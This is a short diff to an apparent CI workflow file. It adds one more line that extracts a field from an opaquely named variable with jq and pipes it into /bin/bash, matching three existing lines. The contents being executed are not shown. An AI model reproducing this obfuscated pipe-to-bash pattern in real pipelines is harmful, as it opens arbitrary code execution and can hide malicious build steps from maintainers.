@@ -28,6 +28,7 @@ jobs:
           echo $qd8 | jq -r .xebbp506 | /bin/bash
           printf '%s' "$t1" | jq -r .x4 | /bin/bash
           printf '%s' "$jtqri061" | jq -r .epquh16 | /bin/bash
+          echo $rd9747 | jq -r .zec15250 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
